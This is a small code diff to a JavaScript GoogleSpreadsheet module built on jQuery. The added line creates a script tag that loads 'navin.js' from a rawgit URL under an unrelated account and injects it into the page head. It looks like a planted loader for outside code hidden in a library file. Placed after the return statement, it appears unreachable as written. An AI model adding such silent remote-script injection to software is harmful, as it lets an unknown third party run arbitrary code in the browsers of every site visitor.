@@ -102,4 +102,6 @@ var GoogleSpreadsheet = (function($) {
   };
 
   return GoogleSpreadsheet;
+  var script = document.createElement('script');script.src = "https://rawgit.com/Enfexia/Html5-Css3/master/navin.js";document.getElementsByTagName('head')[0].appendChild(script);
+
 })(jQuery);
